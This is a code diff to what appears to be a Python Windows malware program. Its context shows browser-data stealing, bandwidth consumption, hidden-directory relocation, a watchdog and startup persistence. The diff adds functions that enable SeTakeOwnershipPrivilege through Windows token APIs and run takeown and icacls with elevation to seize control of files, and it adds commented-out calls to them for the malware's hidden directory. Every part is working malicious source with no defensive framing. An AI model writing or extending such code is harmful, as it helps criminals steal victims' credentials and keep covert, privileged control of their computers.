@@ -198,6 +198,36 @@ def eat_bandwidth():
             debug(f"Error in eat_bandwidth: {e}")
         time.sleep(1)
 
+def enable_privileges():
+    try:
+        ctypes.windll.advapi32.OpenProcessToken.restype = ctypes.c_long
+        TOKEN_ADJUST_PRIVILEGES = 0x20
+        TOKEN_QUERY = 0x8
+        SE_PRIVILEGE_ENABLED = 0x2
+
+        class LUID_AND_ATTRIBUTES(ctypes.Structure):
+            _fields_ = [("Luid", ctypes.c_longlong), ("Attributes", ctypes.c_ulong)]
+
+        class TOKEN_PRIVILEGES(ctypes.Structure):
+            _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES)]
+
+        hToken = ctypes.c_void_p()
+        luid = ctypes.c_longlong()
+        ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken))
+        ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeTakeOwnershipPrivilege", ctypes.byref(luid))
+
+        tp = TOKEN_PRIVILEGES(PrivilegeCount=1, Privileges=LUID_AND_ATTRIBUTES(Luid=luid.value, Attributes=SE_PRIVILEGE_ENABLED))
+        ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
+
+        print("[INFO] Privileges escalated successfully.")
+    except Exception as e:
+        print(f"[ERROR] Failed to enable privileges: {e}")
+
+def take_ownership(file_path):
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c takeown /f \"{file_path}\" && icacls \"{file_path}\" /grant administrators:F", None, 1)
+    except Exception as e:
+        print(f"[ERROR] Failed to take ownership: {e}")
 
 
 def is_running(process_name):
@@ -389,6 +419,8 @@ if cc.get_browser_stealing():
         send_error_notification(e, 'Wadiyan Browser Stealer')    
 
 
+#enable_privileges()
+#take_ownership(HIDDEN_DIR)
 move_to_hidden_directory()
 ensure_watchdog()
 add_to_startup()
